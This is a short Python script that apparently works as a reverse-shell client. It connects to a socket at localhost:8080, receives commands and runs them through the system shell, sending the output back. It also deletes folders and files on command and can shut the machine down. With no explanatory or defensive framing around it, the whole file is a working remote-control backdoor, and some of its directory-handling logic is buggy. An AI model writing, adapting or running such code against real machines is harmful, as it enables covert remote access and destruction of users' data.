import socket
import time
import os
import subprocess
import shutil
from pathlib import Path
class Connection:
    def Main_Conn(self):
        os.chdir('C:/')
        C=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        v=C.connect_ex(("localhost",8080))
        C.settimeout(600)
        while True:
            cmd=C.recv(1024).decode()
            cmd=str(cmd)
            z=cmd.split()
            print(z)
            if len(z)>0:
                if z[0]=='cd' and len(z)>=1:
                    c=os.getcwd()
                    print(c)
                    #p=''
                    #z[1]
                    print(z[1])
                    s=os.chdir(c+z[1])
                    print(s)
                    b=os.getcwd()
                    print(b)
                    C.send(bytes(b,'utf-8'))
                if z[0]=='rmdir' and len(z)>=2:
                    b=os.getcwd()
                    shutil.rmtree(z[1])
                    print("folder Removed"+z[1])
                    C.send(bytes("folder Removed "+z[1],'utf-8'))
                if z[0]=='remove' and len(z)>=2:
                    b=os.getcwd()
                    os.remove(b+z[1])
                    print("File Removed"+z[1])
                    C.send(bytes("File Removed "+z[1],'utf-8'))
                if z[0]=='mkdir':
                    a=z[1]
                    s=os.getcwd()
                    path=os.path.join(s,a)
                    os.mkdir(path)
                    print("folder Created Sucessfully")
                    C.send(bytes("folder Created Sucessfully",'utf-8'))
                if z[0]=='cd' and z[1]=='..' and len(z)==1:
                    p=os.getcwd()
                    x=os.path.dirname(p)
                    z=os.chdir(x)
                    C.send(bytes(x,'utf-8'))
                if z[0]=='shutdown' or z[0]=='Shutdown' and len(z)>=1:
                    os.system("shutdown now")
                else:
                    com=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                    x=com.stdout.decode()+com.stderr.decode()
                    print(x)
                    C.send(bytes(x,'utf-8'))
            else:
                print("hi")
                com=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
                x=com.stdout.decode()+com.stderr.decode()
                print(x)
                C.send(bytes(x,'utf-8'))
a=Connection()
a.Main_Conn()
